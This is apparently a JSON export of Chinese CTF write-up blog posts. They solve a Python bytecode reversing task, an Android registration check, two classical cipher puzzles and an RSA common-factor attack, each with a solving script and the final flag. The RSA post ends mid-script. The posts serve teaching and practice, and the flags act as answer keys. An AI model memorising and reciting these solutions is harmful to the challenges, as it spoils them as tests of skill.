{"posts":[{"title":"Reverse｜[GWCTF 2019]pyre","content":"pyc文件反编译 uncompyle6 -o pcat.py attachment.pyc pcat.py # uncompyle6 version 3.8.0 # Python bytecode 2.7 (62211) # Decompiled from: Python 3.10.6 (main, Aug 30 2022, 04:58:14) [Clang 13.1.6 (clang-1316.0.21.2.5)] # Embedded file name: encode.py # Compiled at: 2019-08-19 21:01:57 print 'Welcome to Re World!' print 'Your input1 is your flag~' l = len(input1) for i in range(l): num = ((input1[i] + i) % 128 + 128) % 128 code += num for i in range(l - 1): code[i] = code[i] ^ code[(i + 1)] print code code = ['\\x1f', '\\x12', '\\x1d', '(', '0', '4', '\\x01', '\\x06', '\\x14', '4', ',', '\\x1b', 'U', '?', 'o', '6', '*', ':', '\\x01', 'D', ';', '%', '\\x13'] 得到源码直接逆向即可 异或逆向： A ^ A =0，A ^ 0 =A 13、14行使code[i]=code[i]code[i+1]，i从0取到l-1-1。处理后，code[l-1]没有变，那么要逆向，则令x从l-2取到0，使code[x]=code[x]code[x+1]（abb=a)。 取模逆向： (a%c+b%c)%c=(a+b)%c 所以逆向为(input1[i] - i) % 128 脚本： code = ['\\x1f', '\\x12', '\\x1d', '(', '0', '4', '\\x01', '\\x06', '\\x14', '4', ',', '\\x1b', 'U', '?', 'o', '6', '*', ':', '\\x01', 'D', ';', '%', '\\x13'] l = len(code) flag='' for i in range(l - 2,-1,-1): code[i] = chr(ord(code[i]) ^ ord(code[i + 1])) for i in range(l): flag += chr((ord(code[i]) - i) % 128) print(flag) GWHT{Just_Re_1s_Ha66y!} ","link":"https://scarecr0w7.github.io/post/reverseorgwctf-2019pyre/"},{"title":"Reverse｜Buuctf 简单注册器","content":"反编译apk文件，搜索flag找到关键代码 public void onClick(View param1View) { byte b = 1; String str = editview.getText().toString(); if (str.length() != 32 || str.charAt(31) != 'a' || str.charAt(1) != 'b' || str.charAt(0) + str.charAt(2) - 48 != 56) b = 0; if (b == 1) { char[] arrayOfChar = &quot;dd2940c04462b4dd7c450528835cca15&quot;.toCharArray(); arrayOfChar[2] = (char)(char)(arrayOfChar[2] + arrayOfChar[3] - 50); arrayOfChar[4] = (char)(char)(arrayOfChar[2] + arrayOfChar[5] - 48); arrayOfChar[30] = (char)(char)(arrayOfChar[31] + arrayOfChar[9] - 48); arrayOfChar[14] = (char)(char)(arrayOfChar[27] + arrayOfChar[28] - 97); for (b = 0;; b++) { String str1; if (b &gt;= 16) { str1 = String.valueOf(arrayOfChar); textview.setText(&quot;flag{&quot; + str1 + &quot;}&quot;); return; } String str2 = str1[31 - b]; str1[31 - b] = str1[b]; str1[b] = str2; } } 编写脚本： flagtrue = &quot;dd2940c04462b4dd7c450528835cca15&quot; x = [i for i in flagtrue] x[2] = chr(ord(x[2]) + ord(x[3]) - 0x32) x[4] = chr(ord(x[2]) + ord(x[5]) - 0x30) x[0x1e] = chr(ord(x[0x1f]) + ord(x[0x9]) - 0x30) x[0xe] = chr(ord(x[0x1b]) + ord(x[0x1c]) - 0x61) for i in range(16): x[i],x[31-i] = x[31-i],x[i] print (&quot;flag{&quot;+ ''.join(x) + &quot;}&quot;) flag{59acc538825054c7de4b26440c0999dd} ","link":"https://scarecr0w7.github.io/post/cryptoorbuuctf-jian-dan-zhu-ce-qi/"},{"title":"Crypto｜Buuctf 一张谍报","content":" 题目提示： 国家能源总部经过派出卧底长期刺探，终于找到一个潜伏已久的国外内鬼：三楼能源楼管老王。由于抓捕仓促，老王服毒自尽了。侦查部门搜出老王每日看的报纸原来是特制的情报。聪明的你能从附件的报纸中找出情报么？flag是老王说的暗号。（由于老王的线人曾今做的土匪，所以用的行话） 利用str2和str3得到str1中目标字符串的位置 脚本： flag=&quot;&quot; str1=&quot;今天上午，朝歌区梆子公司决定，在每天三更天不亮免费在各大小区门口设卡为全城提供二次震耳欲聋的敲更提醒，呼吁大家早睡早起，不要因为贪睡断送大好人生，时代的符号是前进。为此，全区老人都蹲在该公司东边树丛合力抵制，不给公司人员放行，场面混乱。李罗鹰住进朝歌区五十年了，人称老鹰头，几年孙子李虎南刚从东北当猎户回来，每月还寄回来几块鼹鼠干。李罗鹰当年遇到的老婆是朝歌一枝花，所以李南虎是长得非常秀气的一个汉子。李罗鹰表示：无论梆子公司做的对错，反正不能打扰他孙子睡觉，子曰：‘睡觉乃人之常情’。梆子公司这是连菩萨睡觉都不放过啊。李南虎表示：梆子公司智商捉急，小心居民猴急跳墙！这三伏天都不给睡觉，这不扯淡么！到了中午人群仍未离散，更有人提议要烧掉这个公司，公司高层似乎恨不得找个洞钻进去。直到治安人员出现才疏散人群归家，但是李南虎仍旧表示爷爷年纪大了，睡不好对身体不好。&quot; str2=&quot;喵天上午，汪歌区哞叽公司决定，在每天八哇天不全免费在各大小区门脑设卡为全城提供双次震耳欲聋的敲哇提醒，呼吁大家早睡早起，不要因为贪睡断送大好人生，时代的编号是前进。为此，全区眠人都足在该公司流边草丛合力抵制，不给公司人员放行，场面混乱。李罗鸟住进汪歌区五十年了，人称眠鸟顶，几年孙叽李熬值刚从流北当屁户回来，每月还寄回来几块报信干。李罗鸟当年遇到的眠婆是汪歌一枝花，所以李值熬是长得非常秀气的一个汉叽。李罗鸟表示：无论哞叽公司做的对错，反正不能打扰他孙叽睡觉，叽叶：‘睡觉乃人之常情’。哞叽公司这是连衣服睡觉都不放过啊。李值熬表示：哞叽公司智商捉急，小心居民猴急跳墙！这八伏天都不给睡觉，这不扯淡么！到了中午人群仍未离散，哇有人提议要烧掉这个公司，公司高层似乎恨不得找个洞钻进去。直到治安人员出现才疏散人群归家，但是李值熬仍旧表示爷爷年纪大了，睡不好对身体不好。&quot; str3=&quot;喵汪哞叽双哇顶，眠鸟足屁流脑，八哇报信断流脑全叽，眠鸟进北脑上草，八枝遇孙叽，孙叽对熬编叶：值天衣服放鸟捉猴顶。鸟对：北汪罗汉伏熬乱天门。合编放行，卡编扯呼。人离烧草，报信归洞，孙叽找爷爷。&quot; for i in range(len(str3)): for j in range(len(str2)): if (str3[i]==str2[j]): flag += str1[j] #如果找到这个字了就继续找下一个字 print(flag) 运行得到： 今朝梆子二更头，老鹰蹲猎东口，三更鼹鼠断东口亮子，老鹰进北口上树，三枝遇孙子，孙子对虎符曰：南天菩萨放鹰捉猴头。鹰对：北朝罗汉伏虎乱天门。合符放行，卡符扯呼。人离烧树，鼹鼠归洞，孙子找爷爷。 flag{南天菩萨放鹰捉猴头} ","link":"https://scarecr0w7.github.io/post/cryptoorbuuctf-yi-zhang-die-bao/"},{"title":"Crypto｜Buuctf 达芬奇密码","content":"达芬奇隐藏在蒙娜丽莎中的数字列:1 233 3 2584 1346269 144 5 196418 21 1597 610 377 10946 89 514229 987 8 55 6765 2178309 121393 317811 46368 4181 1 832040 2 28657 75025 34 13 17711 记录在达芬奇窗台口的神秘数字串:36968853882116725547342176952286 分析发现数列为打乱的斐波那契数列，题目提示答案是一串32位十进制数字，猜测是按数列在斐波那契数列的位置更换字符串的顺序 第0位的1就在斐波那契数列第0位，所以3的位置不变，还在第0位。 第1位的233的位置在斐波那契数列第12位，所以6应该移到第12位。 脚本： a = &quot;0 1 2 3 5 8 13 21 34 55 89 144 233 377 610 987 1597 2584 4181 6765 10946 17711 28657 46368 75025 121393 196418 317811 514229 832040 1346269 2178309&quot; b = &quot;0 233 3 2584 1346269 144 5 196418 21 1597 610 377 10946 89 514229 987 8 55 6765 2178309 121393 317811 46368 4181 1 832040 2 28657 75025 34 13 17711&quot; a = a.split(&quot; &quot;) b = b.split(&quot; &quot;) flag = [] m = &quot;36968853882116725547342176952286&quot; for i in range(len(a)): for j in range(len(a)): if a[i] == b[j]: flag.append(m[j]) break print(''.join(flag)) flag{37995588256861228614165223347687} ","link":"https://scarecr0w7.github.io/post/cryptoorbuuctf-da-fen-qi-mi-ma/"},{"title":"Crypto｜Buuctf RSA5","content":"m = xxxxxxxx e = 65537 ========== n c ========== n = 20474918894051778533305262345601880928088284471121823754049725354072477155873778848055073843345820697886641086842612486541250183965966001591342031562953561793332341641334302847996108417466360688139866505179689516589305636902137210185624650854906780037204412206309949199080005576922775773722438863762117750429327585792093447423980002401200613302943834212820909269713876683465817369158585822294675056978970612202885426436071950214538262921077409076160417436699836138801162621314845608796870206834704116707763169847387223307828908570944984416973019427529790029089766264949078038669523465243837675263858062854739083634207 c = 974463908243330865728978769213595400782053398596897741316275722596415018912929508637393850919224969271766388710025195039896961956062895570062146947736340342927974992616678893372744261954172873490878805483241196345881721164078651156067119957816422768524442025688079462656755605982104174001635345874022133045402344010045961111720151990412034477755851802769069309069018738541854130183692204758761427121279982002993939745343695671900015296790637464880337375511536424796890996526681200633086841036320395847725935744757993013352804650575068136129295591306569213300156333650910795946800820067494143364885842896291126137320 n = 20918819960648891349438263046954902210959146407860980742165930253781318759285692492511475263234242002509419079545644051755251311392635763412553499744506421566074721268822337321637265942226790343839856182100575539845358877493718334237585821263388181126545189723429262149630651289446553402190531135520836104217160268349688525168375213462570213612845898989694324269410202496871688649978370284661017399056903931840656757330859626183773396574056413017367606446540199973155630466239453637232936904063706551160650295031273385619470740593510267285957905801566362502262757750629162937373721291789527659531499435235261620309759 c = 15819636201971185538694880505120469332582151856714070824521803121848292387556864177196229718923770810072104155432038682511434979353089791861087415144087855679134383396897817458726543883093567600325204596156649305930352575274039425470836355002691145864435755333821133969266951545158052745938252574301327696822347115053614052423028835532509220641378760800693351542633860702225772638930501021571415907348128269681224178300248272689705308911282208685459668200507057183420662959113956077584781737983254788703048275698921427029884282557468334399677849962342196140864403989162117738206246183665814938783122909930082802031855 n = 25033254625906757272369609119214202033162128625171246436639570615263949157363273213121556825878737923265290579551873824374870957467163989542063489416636713654642486717219231225074115269684119428086352535471683359486248203644461465935500517901513233739152882943010177276545128308412934555830087776128355125932914846459470221102007666912211992310538890654396487111705385730502843589727289829692152177134753098649781412247065660637826282055169991824099110916576856188876975621376606634258927784025787142263367152947108720757222446686415627479703666031871635656314282727051189190889008763055811680040315277078928068816491 c = 4185308529416874005831230781014092407198451385955677399668501833902623478395669279404883990725184332709152443372583701076198786635291739356770857286702107156730020004358955622511061410661058982622055199736820808203841446796305284394651714430918690389486920560834672316158146453183789412140939029029324756035358081754426645160033262924330248675216108270980157049705488620263485129480952814764002865280019185127662449318324279383277766416258142275143923532168798413011028271543085249029048997452212503111742302302065401051458066585395360468447460658672952851643547193822775218387853623453638025492389122204507555908862 n = 21206968097314131007183427944486801953583151151443627943113736996776787181111063957960698092696800555044199156765677935373149598221184792286812213294617749834607696302116136745662816658117055427803315230042700695125718401646810484873064775005221089174056824724922160855810527236751389605017579545235876864998419873065217294820244730785120525126565815560229001887622837549118168081685183371092395128598125004730268910276024806808565802081366898904032509920453785997056150497645234925528883879419642189109649009132381586673390027614766605038951015853086721168018787523459264932165046816881682774229243688581614306480751 c = 4521038011044758441891128468467233088493885750850588985708519911154778090597136126150289041893454126674468141393472662337350361712212694867311622970440707727941113263832357173141775855227973742571088974593476302084111770625764222838366277559560887042948859892138551472680654517814916609279748365580610712259856677740518477086531592233107175470068291903607505799432931989663707477017904611426213770238397005743730386080031955694158466558475599751940245039167629126576784024482348452868313417471542956778285567779435940267140679906686531862467627238401003459101637191297209422470388121802536569761414457618258343550613 n = 22822039733049388110936778173014765663663303811791283234361230649775805923902173438553927805407463106104699773994158375704033093471761387799852168337898526980521753614307899669015931387819927421875316304591521901592823814417756447695701045846773508629371397013053684553042185725059996791532391626429712416994990889693732805181947970071429309599614973772736556299404246424791660679253884940021728846906344198854779191951739719342908761330661910477119933428550774242910420952496929605686154799487839923424336353747442153571678064520763149793294360787821751703543288696726923909670396821551053048035619499706391118145067 c = 15406498580761780108625891878008526815145372096234083936681442225155097299264808624358826686906535594853622687379268969468433072388149786607395396424104318820879443743112358706546753935215756078345959375299650718555759698887852318017597503074317356745122514481807843745626429797861463012940172797612589031686718185390345389295851075279278516147076602270178540690147808314172798987497259330037810328523464851895621851859027823681655934104713689539848047163088666896473665500158179046196538210778897730209572708430067658411755959866033531700460551556380993982706171848970460224304996455600503982223448904878212849412357 n = 21574139855341432908474064784318462018475296809327285532337706940126942575349507668289214078026102682252713757703081553093108823214063791518482289846780197329821139507974763780260290309600884920811959842925540583967085670848765317877441480914852329276375776405689784571404635852204097622600656222714808541872252335877037561388406257181715278766652824786376262249274960467193961956690974853679795249158751078422296580367506219719738762159965958877806187461070689071290948181949561254144310776943334859775121650186245846031720507944987838489723127897223416802436021278671237227993686791944711422345000479751187704426369 c = 20366856150710305124583065375297661819795242238376485264951185336996083744604593418983336285185491197426018595031444652123288461491879021096028203694136683203441692987069563513026001861435722117985559909692670907347563594578265880806540396777223906955491026286843168637367593400342814725694366078337030937104035993569672959361347287894143027186846856772983058328919716702982222142848848117768499996617588305301483085428547267337070998767412540225911508196842253134355901263861121500650240296746702967594224401650220168780537141654489215019142122284308116284129004257364769474080721001708734051264841350424152506027932 n = 25360227412666612490102161131174584819240931803196448481224305250583841439581008528535930814167338381983764991296575637231916547647970573758269411168219302370541684789125112505021148506809643081950237623703181025696585998044695691322012183660424636496897073045557400768745943787342548267386564625462143150176113656264450210023925571945961405709276631990731602198104287528528055650050486159837612279600415259486306154947514005408907590083747758953115486124865486720633820559135063440942528031402951958557630833503775112010715604278114325528993771081233535247118481765852273252404963430792898948219539473312462979849137 c = 19892772524651452341027595619482734356243435671592398172680379981502759695784087900669089919987705675899945658648623800090272599154590123082189645021800958076861518397325439521139995652026377132368232502108620033400051346127757698623886142621793423225749240286511666556091787851683978017506983310073524398287279737680091787333547538239920607761080988243639547570818363788673249582783015475682109984715293163137324439862838574460108793714172603672477766831356411304446881998674779501188163600664488032943639694828698984739492200699684462748922883550002652913518229322945040819064133350314536378694523704793396169065179 n = 22726855244632356029159691753451822163331519237547639938779517751496498713174588935566576167329576494790219360727877166074136496129927296296996970048082870488804456564986667129388136556137013346228118981936899510687589585286517151323048293150257036847475424044378109168179412287889340596394755257704938006162677656581509375471102546261355748251869048003600520034656264521931808651038524134185732929570384705918563982065684145766427962502261522481994191989820110575981906998431553107525542001187655703534683231777988419268338249547641335718393312295800044734534761692799403469497954062897856299031257454735945867491191 c = 6040119795175856407541082360023532204614723858688636724822712717572759793960246341800308149739809871234313049629732934797569781053000686185666374833978403290525072598774001731350244744590772795701065129561898116576499984185920661271123665356132719193665474235596884239108030605882777868856122378222681140570519180321286976947154042272622411303981011302586225630859892731724640574658125478287115198406253847367979883768000812605395482952698689604477719478947595442185921480652637868335673233200662100621025061500895729605305665864693122952557361871523165300206070325660353095592778037767395360329231331322823610060006 n = 23297333791443053297363000786835336095252290818461950054542658327484507406594632785712767459958917943095522594228205423428207345128899745800927319147257669773812669542782839237744305180098276578841929496345963997512244219376701787616046235397139381894837435562662591060768476997333538748065294033141610502252325292801816812268934171361934399951548627267791401089703937389012586581080223313060159456238857080740699528666411303029934807011214953984169785844714159627792016926490955282697877141614638806397689306795328344778478692084754216753425842557818899467945102646776342655167655384224860504086083147841252232760941 c = 5418120301208378713115889465579964257871814114515046096090960159737859076829258516920361577853903925954198406843757303687557848302302200229295916902430205737843601806700738234756698575708612424928480440868739120075888681672062206529156566421276611107802917418993625029690627196813830326369874249777619239603300605876865967515719079797115910578653562787899019310139945904958024882417833736304894765433489476234575356755275147256577387022873348906900149634940747104513850154118106991137072643308620284663108283052245750945228995387803432128842152251549292698947407663643895853432650029352092018372834457054271102816934 n = 28873667904715682722987234293493200306976947898711255064125115933666968678742598858722431426218914462903521596341771131695619382266194233561677824357379805303885993804266436810606263022097900266975250431575654686915049693091467864820512767070713267708993899899011156106766178906700336111712803362113039613548672937053397875663144794018087017731949087794894903737682383916173267421403408140967713071026001874733487295007501068871044649170615709891451856792232315526696220161842742664778581287321318748202431466508948902745314372299799561625186955234673012098210919745879882268512656931714326782335211089576897310591491 c = 9919880463786836684987957979091527477471444996392375244075527841865509160181666543016317634963512437510324198702416322841377489417029572388474450075801462996825244657530286107428186354172836716502817609070590929769261932324275353289939302536440310628698349244872064005700644520223727670950787924296004296883032978941200883362653993351638545860207179022472492671256630427228461852668118035317021428675954874947015197745916918197725121122236369382741533983023462255913924692806249387449016629865823316402366017657844166919846683497851842388058283856219900535567427103603869955066193425501385255322097901531402103883869 n = 22324685947539653722499932469409607533065419157347813961958075689047690465266404384199483683908594787312445528159635527833904475801890381455653807265501217328757871352731293000303438205315816792663917579066674842307743845261771032363928568844669895768092515658328756229245837025261744260614860746997931503548788509983868038349720225305730985576293675269073709022350700836510054067641753713212999954307022524495885583361707378513742162566339010134354907863733205921845038918224463903789841881400814074587261720283879760122070901466517118265422863420376921536734845502100251460872499122236686832189549698020737176683019 c = 1491527050203294989882829248560395184804977277747126143103957219164624187528441047837351263580440686474767380464005540264627910126483129930668344095814547592115061057843470131498075060420395111008619027199037019925701236660166563068245683975787762804359520164701691690916482591026138582705558246869496162759780878437137960823000043988227303003876410503121370163303711603359430764539337597866862508451528158285103251810058741879687875218384160282506172706613359477657215420734816049393339593755489218588796607060261897905233453268671411610631047340459487937479511933450369462213795738933019001471803157607791738538467 n = 27646746423759020111007828653264027999257847645666129907789026054594393648800236117046769112762641778865620892443423100189619327585811384883515424918752749559627553637785037359639801125213256163008431942593727931931898199727552768626775618479833029101249692573716030706695702510982283555740851047022672485743432464647772882314215176114732257497240284164016914018689044557218920300262234652840632406067273375269301008409860193180822366735877288205783314326102263756503786736122321348320031950012144905869556204017430593656052867939493633163499580242224763404338807022510136217187779084917996171602737036564991036724299 c = 21991524128957260536043771284854920393105808126700128222125856775506885721971193109361315961129190814674647136464887087893990660894961612838205086401018885457667488911898654270235561980111174603323721280911197488286585269356849579263043456316319476495888696219344219866516861187654180509247881251251278919346267129904739277386289240394384575124331135655943513831009934023397457082184699737734388823763306805326430395849935770213817533387235486307008892410920611669932693018165569417445885810825749609388627231235840912644654685819620931663346297596334834498661789016450371769203650109994771872404185770230172934013971 n = 20545487405816928731738988374475012686827933709789784391855706835136270270933401203019329136937650878386117187776530639342572123237188053978622697282521473917978282830432161153221216194169879669541998840691383025487220850872075436064308499924958517979727954402965612196081404341651517326364041519250125036424822634354268773895465698920883439222996581226358595873993976604699830613932320720554130011671297944433515047180565484495191003887599891289037982010216357831078328159028953222056918189365840711588671093333013117454034313622855082795813122338562446223041211192277089225078324682108033843023903550172891959673551 c = 14227439188191029461250476692790539654619199888487319429114414557975376308688908028140817157205579804059783807641305577385724758530138514972962209062230576107406142402603484375626077345190883094097636019771377866339531511965136650567412363889183159616188449263752475328663245311059988337996047359263288837436305588848044572937759424466586870280512424336807064729894515840552404756879590698797046333336445465120445087587621743906624279621779634772378802959109714400516183718323267273824736540168545946444437586299214110424738159957388350785999348535171553569373088251552712391288365295267665691357719616011613628772175 n = 27359727711584277234897157724055852794019216845229798938655814269460046384353568138598567755392559653460949444557879120040796798142218939251844762461270251672399546774067275348291003962551964648742053215424620256999345448398805278592777049668281558312871773979931343097806878701114056030041506690476954254006592555275342579529625231194321357904668512121539514880704046969974898412095675082585315458267591016734924646294357666924293908418345508902112711075232047998775303603175363964055048589769318562104883659754974955561725694779754279606726358588862479198815999276839234952142017210593887371950645418417355912567987 c = 3788529784248255027081674540877016372807848222776887920453488878247137930578296797437647922494510483767651150492933356093288965943741570268943861987024276610712717409139946409513963043114463933146088430004237747163422802959250296602570649363016151581364006795894226599584708072582696996740518887606785460775851029814280359385763091078902301957226484620428513604630585131511167015763190591225884202772840456563643159507805711004113901417503751181050823638207803533111429510911616160851391754754434764819568054850823810901159821297849790005646102129354035735350124476838786661542089045509656910348676742844957008857457 n = 27545937603751737248785220891735796468973329738076209144079921449967292572349424539010502287564030116831261268197384650511043068738911429169730640135947800885987171539267214611907687570587001933829208655100828045651391618089603288456570334500533178695238407684702251252671579371018651675054368606282524673369983034682330578308769886456335818733827237294570476853673552685361689144261552895758266522393004116017849397346259119221063821663280935820440671825601452417487330105280889520007917979115568067161590058277418371493228631232457972494285014767469893647892888681433965857496916110704944758070268626897045014782837 c = 14069112970608895732417039977542732665796601893762401500878786871680645798754783315693511261740059725171342404186571066972546332813667711135661176659424619936101038903439144294886379322591635766682645179888058617577572409307484708171144488708410543462972008179994594087473935638026612679389759756811490524127195628741262871304427908481214992471182859308828778119005750928935764927967212343526503410515793717201360360437981322576798056276657140363332700714732224848346808963992302409037706094588964170239521193589470070839790404597252990818583717869140229811712295005710540476356743378906642267045723633874011649259842 n = 25746162075697911560263181791216433062574178572424600336856278176112733054431463253903433128232709054141607100891177804285813783247735063753406524678030561284491481221681954564804141454666928657549670266775659862814924386584148785453647316864935942772919140563506305666207816897601862713092809234429096584753263707828899780979223118181009293655563146526792388913462557306433664296966331469906428665127438829399703002867800269947855869262036714256550075520193125987011945192273531732276641728008406855871598678936585324782438668746810516660152018244253008092470066555687277138937298747951929576231036251316270602513451 c = 17344284860275489477491525819922855326792275128719709401292545608122859829827462088390044612234967551682879954301458425842831995513832410355328065562098763660326163262033200347338773439095709944202252494552172589503915965931524326523663289777583152664722241920800537867331030623906674081852296232306336271542832728410803631170229642717524942332390842467035143631504401140727083270732464237443915263865880580308776111219718961746378842924644142127243573824972533819479079381023103585862099063382129757560124074676150622288706094110075567706403442920696472627797607697962873026112240527498308535903232663939028587036724 n = 23288486934117120315036919418588136227028485494137930196323715336208849327833965693894670567217971727921243839129969128783853015760155446770590696037582684845937132790047363216362087277861336964760890214059732779383020349204803205725870225429985939570141508220041286857810048164696707018663758416807708910671477407366098883430811861933014973409390179948577712579749352299440310543689035651465399867908428885541237776143404376333442949397063249223702355051571790555151203866821867908531733788784978667478707672984539512431549558672467752712004519300318999208102076732501412589104904734983789895358753664077486894529499 c = 10738254418114076548071448844964046468141621740603214384986354189105236977071001429271560636428075970459890958274941762528116445171161040040833357876134689749846940052619392750394683504816081193432350669452446113285638982551762586656329109007214019944975816434827768882704630460001209452239162896576191876324662333153835533956600295255158377025198426950944040643235430211011063586032467724329735785947372051759042138171054165854842472990583800899984893232549092766400510300083585513014171220423103452292891496141806956300396540682381668367564569427813092064053993103537635994311143010708814851867239706492577203899024 n = 19591441383958529435598729113936346657001352578357909347657257239777540424811749817783061233235817916560689138344041497732749011519736303038986277394036718790971374656832741054547056417771501234494768509780369075443550907847298246275717420562375114406055733620258777905222169702036494045086017381084272496162770259955811174440490126514747876661317750649488774992348005044389081101686016446219264069971370646319546429782904810063020324704138495608761532563310699753322444871060383693044481932265801505819646998535192083036872551683405766123968487907648980900712118052346174533513978009131757167547595857552370586353973 c = 3834917098887202931981968704659119341624432294759361919553937551053499607440333234018189141970246302299385742548278589896033282894981200353270637127213483172182529890495903425649116755901631101665876301799865612717750360089085179142750664603454193642053016384714515855868368723508922271767190285521137785688075622832924829248362774476456232826885801046969384519549385428259591566716890844604696258783639390854153039329480726205147199247183621535172450825979047132495439603840806501254997167051142427157381799890725323765558803808030109468048682252028720241357478614704610089120810367192414352034177484688502364022887 n = 19254242571588430171308191757871261075358521158624745702744057556054652332495961196795369630484782930292003238730267396462491733557715379956969694238267908985251699834707734400775311452868924330866502429576951934279223234676654749272932769107390976321208605516299532560054081301829440688796904635446986081691156842271268059970762004259219036753174909942343204432795076377432107630203621754552804124408792358220071862369443201584155711893388877350138023238624566616551246804054720492816226651467017802504094070614892556444425915920269485861799532473383304622064493223627552558344088839860178294589481899206318863310603 c = 6790553533991297205804561991225493105312398825187682250780197510784765226429663284220400480563039341938599783346724051076211265663468643826430109013245014035811178295081939958687087477312867720289964506097819762095244479129359998867671811819738196687884696680463458661374310994610760009474264115750204920875527434486437536623589684519411519100170291423367424938566820315486507444202022408003879118465761273916755290898112991525546114191064022991329724370064632569903856189236177894007766690782630247443895358893983735822824243487181851098787271270256780891094405121947631088729917398317652320497765101790132679171889 n = 26809700251171279102974962949184411136459372267620535198421449833298448092580497485301953796619185339316064387798092220298630428207556482805739803420279056191194360049651767412572609187680508073074653291350998253938793269214230457117194434853888765303403385824786231859450351212449404870776320297419712486574804794325602760347306432927281716160368830187944940128907971027838510079519466846176106565164730963988892400240063089397720414921398936399927948235195085202171264728816184532651138221862240969655185596628285814057082448321749567943946273776184657698104465062749244327092588237927996419620170254423837876806659 c = 386213556608434013769864727123879412041991271528990528548507451210692618986652870424632219424601677524265011043146748309774067894985069288067952546139416819404039688454756044862784630882833496090822568580572859029800646671301748901528132153712913301179254879877441322285914544974519727307311002330350534857867516466612474769753577858660075830592891403551867246057397839688329172530177187042229028685862036140779065771061933528137423019407311473581832405899089709251747002788032002094495379614686544672969073249309703482556386024622814731015767810042969813752548617464974915714425595351940266077021672409858645427346 给了一个e , 然后给了一大批c和 n，写个脚本看了一下这些 , 发现这些n里面存在不互质的数对。从而这题就是模不互质攻击。 有最大公约数的n import gmpy2 n1 = 20474918894051778533305262345601880928088284471121823754049725354072477155873778848055073843345820697886641086842612486541250183965966001591342031562953561793332341641334302847996108417466360688139866505179689516589305636902137210185624650854906780037204412206309949199080005576922775773722438863762117750429327585792093447423980002401200613302943834212820909269713876683465817369158585822294675056978970612202885426436071950214538262921077409076160417436699836138801162621314845608796870206834704116707763169847387223307828908570944984416973019427529790029089766264949078038669523465243837675263858062854739083634207 c1 = 974463908243330865728978769213595400782053398596897741316275722596415018912929508637393850919224969271766388710025195039896961956062895570062146947736340342927974992616678893372744261954172873490878805483241196345881721164078651156067119957816422768524442025688079462656755605982104174001635345874022133045402344010045961111720151990412034477755851802769069309069018738541854130183692204758761427121279982002993939745343695671900015296790637464880337375511536424796890996526681200633086841036320395847725935744757993013352804650575068136129295591306569213300156333650910795946800820067494143364885842896291126137320 n2 = 20918819960648891349438263046954902210959146407860980742165930253781318759285692492511475263234242002509419079545644051755251311392635763412553499744506421566074721268822337321637265942226790343839856182100575539845358877493718334237585821263388181126545189723429262149630651289446553402190531135520836104217160268349688525168375213462570213612845898989694324269410202496871688649978370284661017399056903931840656757330859626183773396574056413017367606446540199973155630466239453637232936904063706551160650295031273385619470740593510267285957905801566362502262757750629162937373721291789527659531499435235261620309759 c2 = 15819636201971185538694880505120469332582151856714070824521803121848292387556864177196229718923770810072104155432038682511434979353089791861087415144087855679134383396897817458726543883093567600325204596156649305930352575274039425470836355002691145864435755333821133969266951545158052745938252574301327696822347115053614052423028835532509220641378760800693351542633860702225772638930501021571415907348128269681224178300248272689705308911282208685459668200507057183420662959113956077584781737983254788703048275698921427029884282557468334399677849962342196140864403989162117738206246183665814938783122909930082802031855 n3 = 25033254625906757272369609119214202033162128625171246436639570615263949157363273213121556825878737923265290579551873824374870957467163989542063489416636713654642486717219231225074115269684119428086352535471683359486248203644461465935500517901513233739152882943010177276545128308412934555830087776128355125932914846459470221102007666912211992310538890654396487111705385730502843589727289829692152177134753098649781412247065660637826282055169991824099110916576856188876975621376606634258927784025787142263367152947108720757222446686415627479703666031871635656314282727051189190889008763055811680040315277078928068816491 c3 = 4185308529416874005831230781014092407198451385955677399668501833902623478395669279404883990725184332709152443372583701076198786635291739356770857286702107156730020004358955622511061410661058982622055199736820808203841446796305284394651714430918690389486920560834672316158146453183789412140939029029324756035358081754426645160033262924330248675216108270980157049705488620263485129480952814764002865280019185127662449318324279383277766416258142275143923532168798413011028271543085249029048997452212503111742302302065401051458066585395360468447460658672952851643547193822775218387853623453638025492389122204507555908862 n4 = 21206968097314131007183427944486801953583151151443627943113736996776787181111063957960698092696800555044199156765677935373149598221184792286812213294617749834607696302116136745662816658117055427803315230042700695125718401646810484873064775005221089174056824724922160855810527236751389605017579545235876864998419873065217294820244730785120525126565815560229001887622837549118168081685183371092395128598125004730268910276024806808565802081366898904032509920453785997056150497645234925528883879419642189109649009132381586673390027614766605038951015853086721168018787523459264932165046816881682774229243688581614306480751 c4 = 4521038011044758441891128468467233088493885750850588985708519911154778090597136126150289041893454126674468141393472662337350361712212694867311622970440707727941113263832357173141775855227973742571088974593476302084111770625764222838366277559560887042948859892138551472680654517814916609279748365580610712259856677740518477086531592233107175470068291903607505799432931989663707477017904611426213770238397005743730386080031955694158466558475599751940245039167629126576784024482348452868313417471542956778285567779435940267140679906686531862467627238401003459101637191297209422470388121802536569761414457618258343550613 n5 = 22822039733049388110936778173014765663663303811791283234361230649775805923902173438553927805407463106104699773994158375704033093471761387799852168337898526980521753614307899669015931387819927421875316304591521901592823814417756447695701045846773508629371397013053684553042185725059996791532391626429712416994990889693732805181947970071429309599614973772736556299404246424791660679253884940021728846906344198854779191951739719342908761330661910477119933428550774242910420952496929605686154799487839923424336353747442153571678064520763149793294360787821751703543288696726923909670396821551053048035619499706391118145067 c5 = 15406498580761780108625891878008526815145372096234083936681442225155097299264808624358826686906535594853622687379268969468433072388149786607395396424104318820879443743112358706546753935215756078345959375299650718555759698887852318017597503074317356745122514481807843745626429797861463012940172797612589031686718185390345389295851075279278516147076602270178540690147808314172798987497259330037810328523464851895621851859027823681655934104713689539848047163088666896473665500158179046196538210778897730209572708430067658411755959866033531700460551556380993982706171848970460224304996455600503982223448904878212849412357 n6 = 21574139855341432908474064784318462018475296809327285532337706940126942575349507668289214078026102682252713757703081553093108823214063791518482289846780197329821139507974763780260290309600884920811959842925540583967085670848765317877441480914852329276375776405689784571404635852204097622600656222714808541872252335877037561388406257181715278766652824786376262249274960467193961956690974853679795249158751078422296580367506219719738762159965958877806187461070689071290948181949561254144310776943334859775121650186245846031720507944987838489723127897223416802436021278671237227993686791944711422345000479751187704426369 c6 = 